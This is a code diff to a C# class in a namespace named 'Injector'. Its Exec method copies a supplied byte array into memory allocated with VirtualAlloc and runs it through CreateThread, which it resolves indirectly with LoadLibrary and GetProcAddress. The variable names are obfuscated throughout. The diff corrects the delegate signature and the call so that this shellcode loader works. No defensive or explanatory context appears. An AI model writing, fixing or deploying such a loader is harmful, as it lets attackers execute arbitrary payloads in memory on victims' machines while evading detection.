@@ -18,7 +18,7 @@ namespace Injector
 		private static extern UInt32 WaitForSingleObject(IntPtr VAR3, UInt32 VAR4);
 		
 		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-		private delegate IntPtr VAR10(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, IntPtr VAR6, UInt32 VAR7, ref UInt32 VAR8);
+		private delegate IntPtr VAR10(IntPtr VAR3, UInt32 VAR4, IntPtr VAR5, IntPtr VAR6, UInt32 VAR7, UInt32 VAR8);
 		
 		[DllImport("kernel32.dll")]
 		public static extern IntPtr LoadLibrary(string VAR3);
@@ -30,16 +30,14 @@ namespace Injector
         static public void Exec(byte[] cmd)
         {
 			IntPtr VAR11 = LoadLibrary("kernel32.dll");
-                        IntPtr VAR12 = GetProcAddress(VAR11, "CreateThread");
+			IntPtr VAR12 = GetProcAddress(VAR11, "CreateThread");
 			VAR10 VAR13 = (VAR10)Marshal.GetDelegateForFunctionPointer(VAR12, typeof(VAR10));
 			UInt32 VAR14 = VirtualAlloc(0, (UInt32)cmd.Length, VAR1, VAR2);
 			Marshal.Copy(cmd, 0, (IntPtr)(VAR14), cmd.Length);
 			IntPtr VAR15 = IntPtr.Zero;
 			IntPtr VAR16 = IntPtr.Zero;
-			UInt32 VAR17 = 0;
-			VAR15 = VAR13(0, 0, VAR14, VAR16, 0, ref VAR15);
+			VAR15 = VAR13(IntPtr.Zero, 0, (IntPtr)VAR14, VAR16, 0, 0);
 			WaitForSingleObject(VAR15, 0xFFFFFFFF);
-			return true;
 		}
     }
 }
